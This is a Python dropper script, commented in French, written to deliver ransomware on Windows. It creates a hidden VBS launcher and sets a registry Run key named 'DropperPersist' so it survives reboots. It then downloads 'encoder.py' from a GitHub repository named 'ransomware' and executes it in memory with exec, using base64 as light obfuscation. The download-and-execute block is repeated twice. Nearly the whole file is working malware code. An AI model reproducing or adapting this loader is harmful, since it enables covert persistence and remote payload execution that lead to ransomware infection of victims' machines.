import base64 as b64
import requests as r
import winreg as reg
import os
import sys

# URL RAW du script cible (encoder.py)
url = "https://raw.githubusercontent.com/mehdibha09/ransomware/main/encoder.py"

# Chemin du dossier et fichier VBS
vbs_folder = r"C:\TempDropper"
vbs_path = os.path.join(vbs_folder, "dropper.vbs")

if not os.path.exists(vbs_folder):
        os.makedirs(vbs_folder)
if not os.path.isfile(vbs_path):
        # Exemple simple : VBS qui lance ce script Python
        vbs_code = f'''
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "python {os.path.abspath(sys.argv[0])}", 0, False
'''
        with open(vbs_path, "w", encoding="utf-8") as f:
            f.write(vbs_code)
        print(f"[+] Fichier VBS créé : {vbs_path}")
else:
        print(f"[=] Fichier VBS déjà existant : {vbs_path}")

try:
        # Chemin absolu vers ce script Python (dropper)
        chemin_script = os.path.abspath(sys.argv[0])

        # Commande python avec chemin du script à relancer
        commande = f'python "{chemin_script}"'

        # Ouvrir la clé Run de l'utilisateur courant
        key = reg.OpenKey(reg.HKEY_CURRENT_USER,
                          r"Software\Microsoft\Windows\CurrentVersion\Run",
                          0, reg.KEY_SET_VALUE)

        # Ajouter une valeur avec un nom arbitraire, ici "DropperPersist"
        reg.SetValueEx(key, "DropperPersist", 0, reg.REG_SZ, commande)
        reg.CloseKey(key)
        print("[+] Persistance ajoutée dans le registre.")

except Exception as e:
        print("[-] Échec persistance registre :", e)

try:
    print("[+] Ajout persistance au registre...")

    print("[+] Téléchargement de encoder.py ...")
    reponse = r.get(url)

    if reponse.status_code == 200:
        code = reponse.text
        print("[+] Téléchargement réussi, exécution en mémoire...")

        enc = b64.b64encode(code.encode()).decode()
        exec(b64.b64decode(enc))

    else:
        print(f"[-] Échec : HTTP {reponse.status_code}")

except Exception as e:
    print("[-] Erreur :", e)

try:
    print("[+] Téléchargement de encoder.py ...")
    reponse = r.get(url)

    if reponse.status_code == 200:
        code = reponse.text
        print("[+] Téléchargement réussi, exécution en mémoire...")

        # Encodage base64 pour offuscation légère
        enc = b64.b64encode(code.encode()).decode()

        # Décodage et exécution en mémoire
        exec(b64.b64decode(enc))

    else:
        print(f"[-] Échec : HTTP {reponse.status_code}")

except Exception as e:
    print("[-] Erreur :", e)
